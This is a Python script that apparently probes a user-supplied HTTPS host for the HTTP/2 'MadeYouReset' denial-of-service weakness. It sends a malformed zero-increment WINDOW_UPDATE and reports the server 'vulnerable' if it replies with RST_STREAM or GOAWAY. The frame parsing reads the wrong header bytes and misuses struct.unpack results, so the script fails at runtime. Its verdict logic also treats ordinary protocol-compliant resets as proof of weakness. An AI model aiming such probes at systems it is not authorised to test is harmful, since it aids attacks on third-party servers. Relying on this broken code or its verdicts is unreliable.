import socket
import ssl
import struct

FRAME_HEADER_LEN = 9

def stylized_creator_name():
    name = "Test MadeYouReset Attack with KP"
    border = "*" * (len(name) + 8)
    print("\n" + border)
    print(f"***  {name}  ***")
    print(border + "\n")

def build_frame(frame_type, flags, stream_id, payload):
    length = len(payload)
    length_bytes = struct.pack('!I', length)[1:]
    type_byte = struct.pack('B', frame_type)
    flags_byte = struct.pack('B', flags)
    stream_id_bytes = struct.pack('!I', stream_id & 0x7FFFFFFF)
    return length_bytes + type_byte + flags_byte + stream_id_bytes + payload

def build_settings_frame():
    return build_frame(frame_type=4, flags=0, stream_id=0, payload=b'')

def build_headers_frame(stream_id):
    flags = 0x05  # END_HEADERS + END_STREAM
    payload = b""
    return build_frame(frame_type=1, flags=flags, stream_id=stream_id, payload=payload)

def build_malformed_window_update(stream_id):
    increment = 0
    payload = struct.pack('!I', increment)
    return build_frame(frame_type=8, flags=0, stream_id=stream_id, payload=payload)

def read_frame(sock):
    header = b""
    while len(header) < FRAME_HEADER_LEN:
        data = sock.recv(FRAME_HEADER_LEN - len(header))
        if not data:
            raise ConnectionError("Connection closed by server.")
        header += data

    length = struct.unpack('!I', b'\x00' + header[0:3])[0]
    frame_type = header[1]
    flags = header[2]
    stream_id = struct.unpack('!I', header[5:9]) & 0x7FFFFFFF

    payload = b""
    while len(payload) < length:
        data = sock.recv(length - len(payload))
        if not data:
            raise ConnectionError("Connection closed by server.")
        payload += data

    return frame_type, flags, stream_id, payload

def main():
    stylized_creator_name()

    target_domain = input("Enter the target domain (e.g., login.example.com): ").strip()
    target_port = 443

    try:
        sock = socket.create_connection((target_domain, target_port))
        context = ssl.create_default_context()
        context.check_hostname = True
        context.verify_mode = ssl.CERT_REQUIRED
        tls_sock = context.wrap_socket(sock, server_hostname=target_domain)

        # HTTP/2 client connection preface
        client_preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        tls_sock.sendall(client_preface)

        tls_sock.sendall(build_settings_frame())

        stream_id = 1
        tls_sock.sendall(build_headers_frame(stream_id))

        tls_sock.sendall(build_malformed_window_update(stream_id))

        print("\nSent malformed WINDOW_UPDATE. Waiting for response...\n")

        vulnerable = False
        tls_sock.settimeout(5.0)

        while True:
            frame_type, flags, frame_stream_id, payload = read_frame(tls_sock)

            if frame_type == 3:  # RST_STREAM frame
                error_code = struct.unpack('!I', payload)[0]
                print(f"Received RST_STREAM on stream {frame_stream_id} with error code {error_code}")
                vulnerable = True
                break

            if frame_type == 7:  # GOAWAY frame
                last_stream_id = struct.unpack('!I', payload[0:4])[0] & 0x7FFFFFFF
                error_code = struct.unpack('!I', payload[4:8])
                print(f"Received GOAWAY with last_stream_id {last_stream_id}, error code {error_code}")
                vulnerable = True
                break

    except socket.timeout:
        pass
    except ConnectionError as e:
        print(f"Connection closed by server: {e}")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        try:
            tls_sock.close()
            sock.close()
        except:
            pass

    if vulnerable:
        print("\nThe server IS vulnerable to MadeYouReset attack.")
    else:
        print("\nThe server does NOT appear vulnerable to MadeYouReset attack.")

if __name__ == "__main__":
    main()
